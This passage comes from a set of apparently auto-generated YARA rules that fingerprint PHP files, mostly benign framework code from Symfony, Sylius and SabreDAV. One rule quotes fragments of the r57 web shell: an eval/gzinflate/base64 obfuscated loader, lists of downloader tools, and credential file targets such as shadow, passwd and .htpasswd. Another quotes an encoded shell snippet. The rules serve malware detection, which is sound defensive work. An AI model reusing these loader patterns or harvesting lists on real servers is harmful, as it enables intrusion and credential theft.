      $s3 = "$this->assertFalse($definition->getOption('no-confirmation')->acceptValue()); // It shouldn't accept value because it is" fullword ascii
      $s4 = "use OldSound\\RabbitMqBundle\\Command\\PurgeConsumerCommand;" fullword ascii
      $s5 = "namespace OldSound\\RabbitMqBundle\\Tests\\Command;" fullword ascii
      $s6 = "$definition = $this->command->getDefinition();" fullword ascii
      $s7 = "public function testInputsDefinitionCommand()" fullword ascii
      $s8 = "$this->command = new PurgeConsumerCommand();" fullword ascii
      $s9 = "new InputOption('--no-confirmation', null, InputOption::VALUE_NONE, 'Switches off confirmation mode.')," fullword ascii
      $s10 = "$this->command->setApplication($this->application);" fullword ascii
      $s11 = "class PurgeCommandTest extends BaseCommandTest" fullword ascii
      $s12 = "use Symfony\\Component\\Console\\Input\\InputOption;" fullword ascii
      $s13 = "->method('getHelperSet')" fullword ascii
      $s14 = "$this->assertTrue($definition->hasOption('no-confirmation'));" fullword ascii
      $s15 = "->method('getOptions')" fullword ascii
      $s16 = "$this->assertTrue($definition->hasArgument('name'));" fullword ascii
      $s17 = "->will($this->returnValue($this->helperSet));" fullword ascii
      $s18 = "$this->definition->expects($this->any())" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule product_review_email_template
{
   meta:
      description = "php22 - file product-review-email-template.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4d4b40f93316045a778330a2d4f436c6155e14aa619d9e324631720e01344e9e"
   strings:
      $s1 = "<th style=\"text-align: left;\"><?=$review->getAttributeLabel('author_email')?></th>" fullword ascii
      $s2 = "<th style=\"text-align: left;\"><?=$review->getAttributeLabel('author_phone')?></th>" fullword ascii
      $s3 = "<th style=\"text-align: left;\"><?=$review->getAttributeLabel('author_name')?></th>" fullword ascii
      $s4 = "isset($review->author_phone) ? $review->author_phone : Html::tag('em', Yii::t('yii', '(not set)'))" fullword ascii
      $s5 = "isset($review->author_email) ? $review->author_email : Html::tag('em', Yii::t('yii', '(not set)'))" fullword ascii
      $s6 = "<th style=\"text-align: left;\"><?=$review->getAttributeLabel('date_submitted')?></th>" fullword ascii
      $s7 = "echo Html::encode($review->user->getDisplayName());" fullword ascii
      $s8 = "<th style=\"text-align: left;\"><?=$review->getAttributeLabel('text')?></th>" fullword ascii
      $s9 = "/** @var \\app\\modules\\review\\models\\Review $review */" fullword ascii
      $s10 = "'See review details ' . Html::a('here', Url::to(['/backend/review/products'], true))" fullword ascii
      $s11 = "isset($review->text) ? $review->text : Html::tag('em', Yii::t('yii', '(not set)'))" fullword ascii
      $s12 = "<table style=\"width: 800px;\" border=\"1\" bordercolor=\"#ddd\" cellspacing=\"0\">" fullword ascii
      $s13 = "Html::a($obj->name, Url::to(['/shop/product/show', 'model' => $obj], true))" fullword ascii
      $s14 = "<h1><?=Yii::t('app', 'Review #{reviewId}', ['reviewId' => $review->id])?></h1>" fullword ascii
      $s15 = "echo Html::encode($review->author_name);" fullword ascii
      $s16 = "$product = Yii::$container->get(Product::class);" fullword ascii
      $s17 = "$obj = $product::findById($review->object_model_id);" fullword ascii
      $s18 = "', ['style' => 'text-align: left;']) . Html::tag(" fullword ascii
      $s19 = "<h2><?=Yii::t('app', 'Review information')?></h2>" fullword ascii
      $s20 = "if ($review->user) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule OrderPaymentStateResolver
{
   meta:
      description = "php22 - file OrderPaymentStateResolver.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1ce5078e0d756ccdd3f6efb361cebd17225d61b94bb16c3c24fca95aa0dda9d9"
   strings:
      $s1 = "private function getTargetTransition(OrderInterface $order): ?string" fullword ascii
      $s2 = "private function getPaymentsWithState(OrderInterface $order, string $state): Collection" fullword ascii
      $s3 = "$completedPayments = $this->getPaymentsWithState($order, PaymentInterface::STATE_COMPLETED);" fullword ascii
      $s4 = "(0 < $completedPayments->count() && $completedPaymentTotal >= $order->getTotal()) ||" fullword ascii
      $s5 = "if ($completedPaymentTotal < $order->getTotal() && 0 < $completedPaymentTotal) {" fullword ascii
      $s6 = "$this->applyTransition($stateMachine, $targetTransition);" fullword ascii
      $s7 = "$refundedPayments = $this->getPaymentsWithState($order, PaymentInterface::STATE_REFUNDED);" fullword ascii
      $s8 = "$targetTransition = $this->getTargetTransition($order);" fullword ascii
      $s9 = "$stateMachine = $this->stateMachineFactory->get($order, OrderPaymentTransitions::GRAPH);" fullword ascii
      $s10 = "return $order->getPayments()->filter(function (PaymentInterface $payment) use ($state) {" fullword ascii
      $s11 = "if (0 < $refundedPayments->count() && $refundedPaymentTotal >= $order->getTotal()) {" fullword ascii
      $s12 = "if (null !== $targetTransition) {" fullword ascii
      $s13 = "$completedPaymentTotal += $payment->getAmount();" fullword ascii
      $s14 = "if ($refundedPaymentTotal < $order->getTotal() && 0 < $refundedPaymentTotal) {" fullword ascii
      $s15 = "private function applyTransition(StateMachineInterface $stateMachine, string $transition): void" fullword ascii
      $s16 = "* @return Collection|PaymentInterface[]" fullword ascii
      $s17 = "* @param FactoryInterface $stateMachineFactory" fullword ascii
      $s18 = "* @param StateMachineInterface $stateMachine" fullword ascii
      $s19 = "* @param string $transition" fullword ascii
      $s20 = "use Sylius\\Component\\Order\\StateResolver\\StateResolverInterface;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}


rule ResolveControllerNameSubscriberTest
{
   meta:
      description = "php22 - file ResolveControllerNameSubscriberTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "49900ecb58c7846c41df07bdc8482c5f8b410f1b6f7ec4097a113ad88bfa8bf1"
   strings:
      $s1 = "$subscriber->onKernelRequest(new GetResponseEvent($httpKernel, $request, HttpKernelInterface::MASTER_REQUEST));" fullword ascii
      $s2 = "use Symfony\\Component\\HttpKernel\\Event\\GetResponseEvent;" fullword ascii
      $s3 = "$httpKernel = $this->getMockBuilder(HttpKernelInterface::class)->getMock();" fullword ascii
      $s4 = "use Symfony\\Component\\HttpKernel\\HttpKernelInterface;" fullword ascii
      $s5 = "$this->assertEquals('App\\\\Final\\\\Format::methodName', $request->attributes->get('_controller'));" fullword ascii
      $s6 = "$this->assertEquals($controller, $request->attributes->get('_controller'));" fullword ascii
      $s7 = "$parser = $this->getMockBuilder(ControllerNameParser::class)->disableOriginalConstructor()->getMock();" fullword ascii
      $s8 = "use Symfony\\Bundle\\FrameworkBundle\\EventListener\\ResolveControllerNameSubscriber;" fullword ascii
      $s9 = "* @dataProvider provideSkippedControllers" fullword ascii
      $s10 = "namespace Symfony\\Bundle\\FrameworkBundle\\Tests\\EventListener;" fullword ascii
      $s11 = "use Symfony\\Bundle\\FrameworkBundle\\Controller\\ControllerNameParser;" fullword ascii
      $s12 = "$request->attributes->set('_controller', 'AppBundle:Starting:format');" fullword ascii
      $s13 = "public function testSkipsOtherControllerFormats($controller)" fullword ascii
      $s14 = "$subscriber = new ResolveControllerNameSubscriber($parser);" fullword ascii
      $s15 = "public function testReplacesControllerAttribute()" fullword ascii
      $s16 = "->willReturn('App\\\\Final\\\\Format::methodName');" fullword ascii
      $s17 = "$request->attributes->set('_controller', $controller);" fullword ascii
      $s18 = "public function provideSkippedControllers()" fullword ascii
      $s19 = "use Symfony\\Bundle\\FrameworkBundle\\Tests\\TestCase;" fullword ascii
      $s20 = "$parser->expects($this->never())" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule php22_polish
{
   meta:
      description = "php22 - file polish.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9d96bf11b1b3c743d8624abe906875820c617e0614656af0a5f382c27499b319"
   strings:
      $s1 = "$lang['alert_delete_multiple'] = 'Are you sure that you want to delete those {items_amount} items?';" fullword ascii
      $s2 = "$lang['alert_delete_multiple_one'] = 'Are you sure that you want to delete this 1 item?';" fullword ascii
      $s3 = "/* Added in version 1.2.1 */" fullword ascii
      $s4 = "/* Added in version 1.3.1 */" fullword ascii
      $s5 = "/* Added in version 1.5.1 */" fullword ascii
      $s6 = "/* Added in version 1.5.6 */" fullword ascii
      $s7 = "/* Added in version 1.4 */" fullword ascii
      $s8 = "/* Added in version 1.2.2 */" fullword ascii
      $s9 = "/* Added in version 1.6.1 */" fullword ascii
      $s10 = "/* Added in version 1.5.8 */" fullword ascii
      $s11 = "/* Added in version 1.5.2 */" fullword ascii
      $s12 = "/* Javascript messages */" fullword ascii
      $s13 = "= \"Wybrany plik przekracza maksymalny rozmiar {max_file_size} dozwolonych plik" fullword ascii
      $s14 = "/* Upload functionality */" fullword ascii
      $s15 = "$lang['error_on_uploading'] " fullword ascii
      $s16 = "$lang['error_max_number_of_files'] " fullword ascii
      $s17 = "$lang['error_accept_file_types'] " fullword ascii
      $s18 = "$lang['minimize_maximize'] = 'Minimalizuj/Maksymalizuj';" fullword ascii
      $s19 = "/* Translated by: @slav123 */" fullword ascii
      $s20 = "$lang['error_max_file_size'] " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule PropertiesCollection
{
   meta:
      description = "php22 - file PropertiesCollection.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "222706c3ee8e23127da9adc62e0e058ed710410f2eaaff3b4691f08ac72b2573"
   strings:
      $x1 = "* @copyright Copyright (C) fruux GmbH (https://fruux.com/)" fullword ascii
      $x2 = "* @author Evert Pot (http://evertpot.com/)" fullword ascii
      $s3 = "* encoded in clark-notation {xmlnamespace}tagname" fullword ascii
      $s4 = "* @license http://sabre.io/license/ Modified BSD License" fullword ascii
      $s5 = "* Read the PropPatch documentation for more information." fullword ascii
      $s6 = "* A node specifically for testing property-related operations" fullword ascii
      $s7 = "* Note that it's fine to liberally give properties back, instead of" fullword ascii
      $s8 = "* If the array is empty, it means 'all properties' were requested." fullword ascii
      $s9 = "* The properties list is a list of propertynames the client requested," fullword ascii
      $s10 = "* This method received a PropPatch object, which contains all the" fullword ascii
      $s11 = "* conforming to the list of requested properties." fullword ascii
      $s12 = "* To update specific properties, call the 'handle' method on this object." fullword ascii
      $s13 = "* Returns a list of properties for this nodes." fullword ascii
      $s14 = "* Updates properties on this node." fullword ascii
      $s15 = "* @param array $requestedProperties" fullword ascii
      $s16 = "* information about the update." fullword ascii
      $s17 = "* @param PropPatch $proppatch" fullword ascii
      $s18 = "function getProperties($requestedProperties) {" fullword ascii
      $s19 = "* Creates the object" fullword ascii
      $s20 = "* The Server class will filter out the extra." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      1 of ($x*) and 4 of them
}

rule PersistentServiceManager
{
   meta:
      description = "php22 - file PersistentServiceManager.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "83f182df2b0bff5118f5bed0f07041b44b4b0d173819ff18e28466294fe8c0c7"
   strings:
      $s1 = "* @var ServiceLocatorInterface Used to retrieve Doctrine services" fullword ascii
      $s2 = "return $this->serviceManager->get($name);" fullword ascii
      $s3 = "class PersistentServiceManager extends ServiceManager implements ServiceLocatorInterface" fullword ascii
      $s4 = "private $serviceManager;" fullword ascii
      $s5 = "return $this->serviceManager->has($name);" fullword ascii
      $s6 = "$this->serviceManager = $serviceManager;" fullword ascii
      $s7 = "public function setService($name, $service)" fullword ascii
      $s8 = "public function get($name)" fullword ascii
      $s9 = "use \\Zend\\ServiceManager\\ServiceManager;" fullword ascii
      $s10 = "return parent::get($name);" fullword ascii
      $s11 = "public function __construct(ServiceLocatorInterface $serviceManager)" fullword ascii
      $s12 = "namespace Codeception\\Lib\\Connector\\ZF2;" fullword ascii
      $s13 = "parent::setService($name, $service);" fullword ascii
      $s14 = "use \\Zend\\ServiceManager\\ServiceLocatorInterface;" fullword ascii
      $s15 = "if (preg_match('/doctrine/i', $name)) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule PermissionRole
{
   meta:
      description = "php22 - file PermissionRole.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8d53ad2697ffbf6781f31ecbdb22fa38fe7ee8cdc8d21cd26f5ce03af8b9b1b9"
   strings:
      $x1 = "* with access to {@link SecurityAdmin} (but no ADMIN privileges) to get themselves ADMIN access" fullword ascii
      $x2 = "* to new groups by a user with ADMIN privileges. This is a simple way to prevent users" fullword ascii
      $s3 = "* business-oriented units of access control - Roles - and assign those to groups." fullword ascii
      $s4 = "* @method HasManyList Codes() List of PermissionRoleCode objects" fullword ascii
      $s5 = "* Because permission codes are very granular, this lets website administrators create more" fullword ascii
      $s6 = "* If the <b>OnlyAdminCanApply</b> property is set to TRUE, the role can only be assigned" fullword ascii
      $s7 = "* A PermissionRole represents a collection of permission codes that can be applied to groups." fullword ascii
      $s8 = "* @method ManyManyList Groups() List of Group objects" fullword ascii
      $s9 = "* (which might be implied by certain roles)." fullword ascii
      $s10 = "* @property string Title" fullword ascii
      $s11 = "$labels['Title'] = _t('SilverStripe\\\\Security\\\\PermissionRole.Title', 'Title');" fullword ascii
      $s12 = "$fields = parent::getCMSFields();" fullword ascii
      $s13 = "private static $table_name = \"PermissionRole\";" fullword ascii
      $s14 = "public function getCMSFields()" fullword ascii
      $s15 = "* @property string OnlyAdminCanApply" fullword ascii
      $s16 = "Permission::config()->hidden_permissions" fullword ascii
      $s17 = "$fields->removeFieldFromTab('Root', 'Groups');" fullword ascii
      $s18 = "$fields->removeFieldFromTab('Root', 'Codes');" fullword ascii
      $s19 = "private static $default_sort = '\"Title\"';" fullword ascii
      $s20 = "private static $belongs_many_many = array(" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      1 of ($x*) and 4 of them
}

rule php22_once03
{
   meta:
      description = "php22 - file once03.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3eccaace000becbc6002e3a8035418f26dceba553c12ea596af26d20e52896f6"
   strings:
      $s1 = "aR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule phpmailer_lang_fa
{
   meta:
      description = "php22 - file phpmailer.lang-fa.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9848091315d0ede1e98c1a3634035eee77b285131e98e2b92d7997252c76e188"
   strings:
      $s1 = "* @author Mohammad Hossein Mojtahedi <mhm5000@gmail.com>" fullword ascii
      $s2 = "* @author Ali Jazayeri <jaza.ali@gmail.com>" fullword ascii
      $s3 = "* Persian/Farsi PHPMailer language file: refer to English translation for definitive list" fullword ascii
      $s4 = "$PHPMAILER_LANG['smtp_connect_failed']  = '" fullword ascii
      $s5 = "$PHPMAILER_LANG['execute']              = '" fullword ascii
      $s6 = "$PHPMAILER_LANG['mailer_not_supported'] = ' mailer " fullword ascii
      $s7 = "$PHPMAILER_LANG['smtp_error']           = '" fullword ascii
      $s8 = "SMTP Server: ';" fullword ascii
      $s9 = "SMTP: " fullword ascii
      $s10 = "SMTP " fullword ascii
      $s11 = "$PHPMAILER_LANG['connect_host']         = '" fullword ascii
      $s12 = "SMTP.';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule RelationshipField
{
   meta:
      description = "php22 - file RelationshipField.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b0c3ad23b067619a25fe69ab18ab20d03635fe7b7d1652a3e4017b0652721923"
   strings:
      $s1 = "* @method $this accesskey($value = true)" fullword ascii
      $s2 = "* @method $this tabindex($value = true)" fullword ascii
      $s3 = "* @method $this autofocus($value = true)" fullword ascii
      $s4 = "* Attributes available for a particular tag." fullword ascii
      $s5 = "* @method $this size($value = true)" fullword ascii
      $s6 = "* @method $this form($value = true)" fullword ascii
      $s7 = "* @method $this name($value = true)" fullword ascii
      $s8 = "* @method $this disabled($value = true)" fullword ascii
      $s9 = "* @method $this multiple($value = true)" fullword ascii
      $s10 = "* @method $this required($value = true)" fullword ascii
      $s11 = "* Default attributes value." fullword ascii
      $s12 = "* Required Attributes." fullword ascii
      $s13 = "* Class RelationshipField." fullword ascii
      $s14 = "public $view = 'dashboard::fields.relationship';" fullword ascii
      $s15 = "namespace Orchid\\Platform\\Fields\\Types;" fullword ascii
      $s16 = "use Orchid\\Platform\\Fields\\Field;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule PBES2AESKW
{
   meta:
      description = "php22 - file PBES2AESKW.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2996f6a73da9da91b79a63212ca1790bb365de46cbbbb9870a49ec0f7017d553"
   strings:
      $x1 = "$derived_key = hash_pbkdf2($hash_algorithm, $password, $complete_headers['alg'].\"\\x00\".$salt, $this->nb_count, $key_size" fullword ascii
      $s2 = "public function wrapKey(JWKInterface $key, $cek, array $complete_headers, array &$additional_headers)" fullword ascii
      $s3 = "$password = Base64Url::decode($key->get('k'));" fullword ascii
      $s4 = "Assertion::keyExists($header, 'alg', 'The header parameter \"alg\" is missing.');" fullword ascii
      $s5 = "Assertion::keyExists($header, 'p2c', 'The header parameter \"p2c\" is missing.');" fullword ascii
      $s6 = "Assertion::keyExists($header, 'p2s', 'The header parameter \"p2s\" is missing.');" fullword ascii
      $s7 = "public function unwrapKey(JWKInterface $key, $encrypted_cek, array $header)" fullword ascii
      $s8 = "Assertion::notEmpty($header['alg'], 'The header parameter \"alg\" is not valid.');" fullword ascii
      $s9 = "Assertion::notEmpty($header['p2s'], 'The header parameter \"p2s\" is not valid.');" fullword ascii
      $s10 = "Assertion::notEmpty($header['p2c'], 'The header parameter \"p2c\" is not valid.');" fullword ascii
      $s11 = "$derived_key = hash_pbkdf2($hash_algorithm, $password, $salt, $count, $key_size, true);" fullword ascii
      $s12 = "$derived_key = hash_pbkdf2($hash_algorithm, $password, $complete_headers['alg'].\"\\x00\".$salt, $this->nb_count, $key_size, tru" ascii
      $s13 = "namespace Jose\\Algorithm\\KeyEncryption;" fullword ascii
      $s14 = "Assertion::eq($key->get('kty'), 'oct', 'Wrong key type.');" fullword ascii
      $s15 = "* @return \\AESKW\\A128KW|\\AESKW\\A192KW|\\AESKW\\A256KW" fullword ascii
      $s16 = "$salt = $header['alg'].\"\\x00\".Base64Url::decode($header['p2s']);" fullword ascii
      $s17 = "* This software may be modified and distributed under the terms" fullword ascii
      $s18 = "* of the MIT license.  See the LICENSE file for details." fullword ascii
      $s19 = "* @param array $header" fullword ascii
      $s20 = "return $wrapper->unwrap($derived_key, $encrypted_cek);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule PrincipalPropertySearchReport
{
   meta:
      description = "php22 - file PrincipalPropertySearchReport.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "57bd1ca3a5b651708ebbe2ed255b8a61f9fe066537d19e2d57f8e38ef8872833"
   strings:
      $x1 = "* @copyright Copyright (C) fruux GmbH (https://fruux.com/)" fullword ascii
      $x2 = "* @author Evert Pot (http://evertpot.com/)" fullword ascii
      $s3 = "* https://tools.ietf.org/html/rfc3744#section-9.4" fullword ascii
      $s4 = "* $reader->parseInnerTree() will parse the entire sub-tree, and advance to" fullword ascii
      $s5 = "* By default the property search will be conducted on the url of the http" fullword ascii
      $s6 = "* You are responsible for advancing the reader to the next element. Not" fullword ascii
      $s7 = "* @license http://sabre.io/license/ Modified BSD License" fullword ascii
      $s8 = "throw new BadRequest('The {DAV:}principal-property-search report must contain at least 1 {DAV:}property-search element');" fullword ascii
      $s9 = "* PrincipalSearchPropertySetReport request parser." fullword ascii
      $s10 = "throw new BadRequest('The {DAV:}principal-property-search report must contain at least 1 {DAV:}property-search eleme" fullword ascii
      $s11 = "* If you just want to skip parsing for this element altogether, you can" fullword ascii
      $s12 = "* This class parses the {DAV:}principal-property-search REPORT, as defined" fullword ascii
      $s13 = "* Search for principals matching ANY of the properties (OR) or a ALL of" fullword ascii
      $s14 = "* request. If this is set to true, it will be applied to the principal" fullword ascii
      $s15 = "* may be used as a type of constructor, or factory method." fullword ascii
      $s16 = "if ($reader->getAttribute('test') === 'anyof') {" fullword ascii
      $s17 = "* This property is either \"anyof\" or \"allof\"." fullword ascii
      $s18 = "throw new BadRequest('The {DAV:}property-search element must contain one {DAV:}match and one {DAV:}prop element');" fullword ascii
      $s19 = "* doing anything will result in a never-ending loop." fullword ascii
      $s20 = "throw new BadRequest('The {DAV:}property-search element must contain one {DAV:}match and one {DAV:}prop " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule Quit_spec
{
   meta:
      description = "php22 - file Quit.spec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f9ba278d11d833678742a863f3b43bbb2d50bb8c1b5f54bc0d7222b193e7988c"
   strings:
      $x1 = "$expected = file_get_contents($this->path . '/FileProcessed.php');" fullword ascii
      $s2 = "$nodes = Parser::parse(file_get_contents($this->path . '/File.php'));" fullword ascii
      $s3 = "$actual = Parser::unparse($this->patcher->process($nodes));" fullword ascii
      $s4 = "describe(\"->process()\", function () {" fullword ascii
      $s5 = "it(\"patches exit/die statements\", function () {" fullword ascii
      $s6 = "namespace Kahlan\\Spec\\Suite\\Jit\\Patcher;" fullword ascii
      $s7 = "describe(\"->patchable()\", function () {" fullword ascii
      $s8 = "$this->path = 'spec/Fixture/Jit/Patcher/Quit';" fullword ascii
      $s9 = "expect($actual)->toBe($expected);" fullword ascii
      $s10 = "it(\"return `true`\", function () {" fullword ascii
      $s11 = "describe(\"Quit\", function () {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      1 of ($x*) and all of them
}

rule php22_r57142
{
   meta:
      description = "php22 - file r57142.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1ea0c74af9d20d3b79531c2e07036a1006a119a34638c17bc83e014e3182313d"
   strings:
      $x1 = "eval(gzinflate(base64_decode(str_rot13('UW3UxdANSxH/MmdPOq4g8FP8SoPMjUii+scEmnnwhdAnIJGzh/ppOMXXZ+a/IJ8mya2lS//FMPfV7Y95xH158r8/" ascii
      $x2 = "$tempdirs = array(@ini_get('session.save_path').'/',@ini_get('upload_tmp_dir').'/','/tmp/','/dev/shm/','/var/tmp/');" fullword ascii
      $x3 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $s4 = "'my.cnf','pureftpd.conf','proftpd.conf','ftpd.conf','resolv.conf','login.conf','smb.conf','sysctl.conf','syslog.conf','access.co" ascii
      $s5 = "$presets_rlph = array('index.php','.htaccess','.htpasswd','httpd.conf','vhosts.conf','cfg.php','config.php','config.inc.php','co" ascii
      $s6 = "$presets_rlph = array('index.php','.htaccess','.htpasswd','httpd.conf','vhosts.conf','cfg.php','config.php','config.inc.php','co" ascii
      $s7 = "nf','accounting.log','home','htdocs'," fullword ascii
      $s8 = "'my.cnf','pureftpd.conf','proftpd.conf','ftpd.conf','resolv.conf','login.conf','smb.conf','sysctl.conf','syslog.conf','access.co" ascii
      $s9 = "'tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');" fullword ascii
      $s10 = "'access','auth','error','backup','data','back','sysconfig','phpbb','phpbb2','vbulletin','vbullet','phpnuke','cgi-bin','html','ro" ascii
      $s11 = "'Documents and Settings','Program Files','boot.ini','apache');" fullword ascii
      $s12 = "LGKq4TkbyGAyqZ1oXtAojp4lhnilXBX4iwqRrih5RQKSAMwgyggGXDqkgLk+tI/cZkAorG+kA5getAmCdpimeJzRKHWeMrmpQaumvOiQLBGtoJkAJzeHsN9PZNjZsTGT" ascii
      $s13 = "/+cZ5y8VYgwko8q/2HKRtHmxlbInx2lueqK9DgUsj60Ahv073Bc2HBEqiq9tyaZuoqhRpvh+CYPWQHCffegW6BuFTNi5wqchWfjP+8GetqJEcosuNiBFt4285fbCH/7d" ascii
      $s14 = "'shadow','passwd','.bash_history','.mysql_history','master.passwd','user','admin','password','administrator','phpMyAdmin','secur" ascii
      $s15 = "bots.txt','billing','Windows'," fullword ascii
      $s16 = "nfig.default.php','config.inc.php'," fullword ascii
      $s17 = "@ini_restore(\"safe_mode_exec_dir\");" fullword ascii
      $s18 = "@ini_alter('error_log',NULL);" fullword ascii
      $s19 = "C4/UJiwMIbp5zd04XWUeMiwU3awyBRAX1kr0sXZGEt/rJfDxHghfWpJvrmqfaxhdVYPYmsr+PrM6YtThlipJ08oW90UAhzt9523Xaa6A5xZvH1wH0zpKbsGUG4aznj/T" ascii
      $s20 = "E2kx4wX6c8JkX+sUVt9J2c7oLV84ZUoPYnE1LD9jspYCD+OQGZqvAEqgxip/7u9tPiajRxzpU/+xnCtxhity1X1I/n4u4coO2j9WKqnhtASEcVl0Z2QqRR5lxO4zIFZL" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule ProductImageType
{
   meta:
      description = "php22 - file ProductImageType.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8de150135b90342fee89f9a87a8c05497e110346152a7a4b1265a1a8f610b9bc"
   strings:
      $s1 = "use Sylius\\Bundle\\ResourceBundle\\Form\\Type\\ResourceAutocompleteChoiceType;" fullword ascii
      $s2 = "public function configureOptions(OptionsResolver $resolver): void" fullword ascii
      $s3 = "use Sylius\\Bundle\\CoreBundle\\Form\\Type\\ImageType;" fullword ascii
      $s4 = "public function buildView(FormView $view, FormInterface $form, array $options): void" fullword ascii
      $s5 = "if (isset($options['product']) && $options['product'] instanceof ProductInterface) {" fullword ascii
      $s6 = "use Symfony\\Component\\OptionsResolver\\OptionsResolver;" fullword ascii
      $s7 = "public function getBlockPrefix(): string" fullword ascii
      $s8 = "public function buildForm(FormBuilderInterface $builder, array $options): void" fullword ascii
      $s9 = "use Sylius\\Component\\Core\\Model\\ProductInterface;" fullword ascii
      $s10 = "use Symfony\\Component\\Form\\FormBuilderInterface;" fullword ascii
      $s11 = "use Symfony\\Component\\Form\\FormInterface;" fullword ascii
      $s12 = "use Symfony\\Component\\Form\\FormView;" fullword ascii
      $s13 = "->add('productVariants', ResourceAutocompleteChoiceType::class, [" fullword ascii
      $s14 = "namespace Sylius\\Bundle\\CoreBundle\\Form\\Type\\Product;" fullword ascii
      $s15 = "parent::configureOptions($resolver);" fullword ascii
      $s16 = "final class ProductImageType extends ImageType" fullword ascii
      $s17 = "'choice_name' => 'descriptor'," fullword ascii
      $s18 = "$view->vars['product'] = $options['product'];" fullword ascii
      $s19 = "'label' => 'sylius.ui.product_variants'," fullword ascii
      $s20 = "parent::buildView($view, $form, $options);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule OctoberInstall
{
   meta:
      description = "php22 - file OctoberInstall.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3d47f40f57e75e473ae4d0898415d8ed1b6d2077375841a3a1a152eb3eb141d5"
   strings:
      $x1 = "$result['password'] = $this->ask('Postgres Password', Config::get('database.connections.pgsql.password') ?: false) ?: ''" fullword ascii
      $x2 = "$result['password'] = $this->ask('Postgres Password', Config::get('database.connections.pgsql.password') ?: false) ?: '';" fullword ascii
      $x3 = "$result['username'] = $this->ask('MySQL Login', Config::get('database.connections.mysql.username'));" fullword ascii
      $x4 = "$result['username'] = $this->ask('Postgres Login', Config::get('database.connections.pgsql.username'));" fullword ascii
      $x5 = "$result['username'] = $this->ask('SQL Login', Config::get('database.connections.sqlsrv.username'));" fullword ascii
      $x6 = "$result['password'] = $this->ask('MySQL Password', Config::get('database.connections.mysql.password') ?: false) ?: '';" fullword ascii
      $x7 = "$result['password'] = $this->ask('SQL Password', Config::get('database.connections.sqlsrv.password') ?: false) ?: '';" fullword ascii
      $x8 = "* Execute the console command." fullword ascii
      $x9 = "$result['database'] = $this->ask('Database Name', Config::get('database.connections.pgsql.database'));" fullword ascii
      $x10 = "$result['database'] = $this->ask('Database Name', Config::get('database.connections.sqlsrv.database'));" fullword ascii
      $x11 = "$result['database'] = $this->ask('Database Name', Config::get('database.connections.mysql.database'));" fullword ascii
      $x12 = "$result['host'] = $this->ask('MySQL Host', Config::get('database.connections.mysql.host'));" fullword ascii
      $x13 = "$result['host'] = $this->ask('Postgres Host', Config::get('database.connections.pgsql.host'));" fullword ascii
      $x14 = "$result['host'] = $this->ask('SQL Host', Config::get('database.connections.sqlsrv.host'));" fullword ascii
      $s15 = "$filename = $this->ask('Database path', Config::get('database.connections.sqlite.database'));" fullword ascii
      $s16 = "$result['port'] = $this->output->ask('MySQL Port', Config::get('database.connections.mysql.port') ?: false) ?: '';" fullword ascii
      $s17 = "$result['port'] = $this->ask('Postgres Port', Config::get('database.connections.pgsql.port') ?: false) ?: '';" fullword ascii
      $s18 = "$result['port'] = $this->ask('SQL Port', Config::get('database.connections.sqlsrv.port') ?: false) ?: '';" fullword ascii
      $s19 = "* Get a config file and contents." fullword ascii
      $s20 = "* The console command description." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and all of them
}

rule ParameterConfirmationTokenTest_ValidToken
{
   meta:
      description = "php22 - file ParameterConfirmationTokenTest_ValidToken.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f95115ddbb97798bcb3a026050e31dbc35bdc05b2b15458f24406bbba4586538"
   strings:
      $s1 = "* A token that always validates a given token" fullword ascii
      $s2 = "namespace SilverStripe\\Core\\Tests\\Startup\\ParameterConfirmationTokenTest;" fullword ascii
      $s3 = "class ParameterConfirmationTokenTest_ValidToken extends ParameterConfirmationTokenTest_Token" fullword ascii
      $s4 = "protected function checkToken($token)" fullword ascii
   condition:
